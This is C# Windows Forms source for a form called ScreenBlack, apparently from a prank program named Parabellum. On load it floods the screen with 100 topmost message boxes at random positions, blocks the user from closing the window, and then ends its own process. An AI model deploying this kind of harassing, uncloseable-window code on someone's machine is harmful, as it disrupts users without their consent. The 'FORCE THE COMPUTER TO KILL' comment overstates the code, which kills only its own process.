using System;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Vanara.PInvoke;
using static Vanara.PInvoke.User32;

namespace Parabellum
{
    public partial class ScreenBlack : Form
    {
        public ScreenBlack()
        {
            InitializeComponent();
        }
        private static void ShowMessageBoxAt(int x, int y)
        {
            var messageBoxThread = new Thread(() =>
            {
                MessageBox(HWND.NULL, "          ???????          ???????         ???????         ???????", "parabellum.exe",
                    MB_FLAGS.MB_OK | MB_FLAGS.MB_ICONQUESTION);
            });
            messageBoxThread.Start();

            var msgBoxHandle = FindWindow(null, "parabellum.exe");
            if (msgBoxHandle != HWND.NULL)
            {
                SetWindowPos(msgBoxHandle, HWND.HWND_TOPMOST, x, y, 0, 0, SetWindowPosFlags.SWP_NOSIZE | SetWindowPosFlags.SWP_NOZORDER);
                SetForegroundWindow(msgBoxHandle);
            }
        }

        private void ScreenBlack_Load(object sender, EventArgs e)
        {
            var timer = new System.Threading.Timer((obj) =>
            {
                Random random = new Random();

                for (int i = 1; i <= 100; i++)
                {
                    int x = random.Next(0, GetSystemMetrics(0) - 200);
                    int y = random.Next(0, GetSystemMetrics((SystemMetric)1) - 100);

                    new Thread(() => ShowMessageBoxAt(x, y)).Start();
                    Thread.Sleep(100);
                }

                Process.GetCurrentProcess().Kill(); // FORCE THE COMPUTER TO KILL
            }, null, 5000, Timeout.Infinite);
        }

        private void ScreenBlack_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}